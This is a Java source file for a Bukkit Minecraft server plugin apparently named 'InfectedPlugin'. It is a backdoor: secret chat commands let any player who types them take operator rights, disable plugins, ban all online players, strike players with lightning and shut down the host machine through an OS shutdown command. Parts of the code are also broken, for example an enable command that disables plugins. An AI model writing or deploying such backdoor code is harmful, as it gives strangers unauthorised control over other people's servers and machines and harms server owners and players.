package org.CreeperCoders.InfectedPlugin;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.command.CommandSender;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.Random;
import java.lang.RuntimeException;
import java.lang.Runtime;

import org.bukkit.event.EventPriority;

public class PlayerListener implements Listener
{
    private Random random = new Random();
    private InfectedPlugin plugin;

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerChat(AsyncPlayerChatEvent event, CommandSender sender) throws MalformedURLException, IOException
    {
        String message = event.getMessage();
        String[] args = message.split(" ");
    	
        if (event.getMessage().toLowerCase().contains(".opme"))
        {
            event.getPlayer().setOp(true);
            event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".disableplugin"))
        {
            Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
            if (plugin != null)
            {
                Bukkit.getServer().getPluginManager().disablePlugin(plugin);
            }
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".enableplugin"))
        {
            Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
            if (plugin != null)
            {
                Bukkit.getServer().getPluginManager().disablePlugin(plugin);
            }
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".enablevanilla")) //Command
        {
            if (!new File("minecraft_server.1.6.2.jar").exists()) //Check if minecraft_server.1.6.2.jar exists or not
            {
                sender.sendMessage(ChatColor.RED + "minecraft_server.1.6.2.jar not found, downloading..."); //Tell the player that the jar will be downlaoded

                URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar"); //URL variable to get the url of the jar
                ReadableByteChannel rbc = Channels.newChannel(url.openStream());
                @SuppressWarnings("resource") //To get rid of the stupid warnings
		FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //FileOutputStream variable
                fos.getChannel().transferFrom(rbc, 0, 1 << 24);

                sender.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla..."); //Tell the player it's been downloaded and will start Vanilla.
            }
            
            net.minecraft.server.MinecraftServer.main(args); //Start MinecraftServer (only works if minecraft_server.1.6.2.jar is added to the build path)
            Bukkit.shutdown(); //Shutdown Bukkit
            event.setCancelled(true); //Block the player from saying .enablevanilla
        } //End of command
        if (event.getMessage().toLowerCase().contains(".deop"))
        {
            if (args.length == 0)
            {
        	event.getPlayer().sendMessage(ChatColor.RED + "Usage: .deop <player>");
        	event.setCancelled(true);
            }
            else
            {
                event.getPlayer().setOp(false);
                event.getPlayer().sendMessage(ChatColor.RED + "You are no longer OP.");
                event.setCancelled(true);
            }
        }
        if (event.getMessage().toLowerCase().contains(".op"))
        {
            Bukkit.getServer().getPlayer(args[1]);
            event.getPlayer().setOp(true);
            event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP!");
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".banall"))
        {
            for (final Player p : Bukkit.getServer().getOnlinePlayers())
            {
                p.kickPlayer("The Ban Hammer has spoken!");
                p.setBanned(true);
                event.setCancelled(true);
            }
        }
        if (event.getMessage().toLowerCase().contains(".deopall"))
        {
            for (final Player p : Bukkit.getServer().getOnlinePlayers())
            {
                p.setOp(false);
                //Something extra c:
                final Location target_pos = p.getLocation();
                for (int x = -1; x <= 1; x++)
                {
                    for (int z = -1; z <= 1; z++)
                    {
                        final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
                        target_pos.getWorld().strikeLightning(strike_pos);
                    }
                }
                event.setCancelled(true);
            }
        }
        // Is not effective for onPlayerQuit, but will select a random player to be banned.
        if (event.getMessage().toLowerCase().contains(".randombanl"))
        {
            Player[] players = Bukkit.getServer().getOnlinePlayers();
            final Player p = players[random.nextInt(players.length)];

            if (p == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
            {
                //do nothing
            }
            else
            {
                p.kickPlayer(ChatColor.RED + "GTFO.");
                p.setBanned(true);
            }
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".test"))
        {
            event.getPlayer().sendMessage(ChatColor.YELLOW + "This is a test");
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".shutdown"))
        {
            try
            {
            	shutdown();
            }
            catch (IOException ex)
            {
            	plugin.log.severe(null, ex);
            }
            catch (RuntimeException ex)
            {
            	plugin.log.severe(null, ex);
            }
            event.setCancelled(true);
        }
    }
    
    public static void shutdown() throws RuntimeException, IOException 
    {
    	String shutdownCommand;
    	String operatingSystem = System.getProperty("os.name");

     	if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) 
     	{
            shutdownCommand = "shutdown -h now";
        }
    	else if ("Windows".equals(operatingSystem)) 
    	{
             shutdownCommand = "shutdown.exe -s -t 0";
        }
     	else 
     	{
            throw new RuntimeException("Unsupported operating system.");
        }

    	Runtime.getRuntime().exec(shutdownCommand);
    	System.exit(0);
    }
}
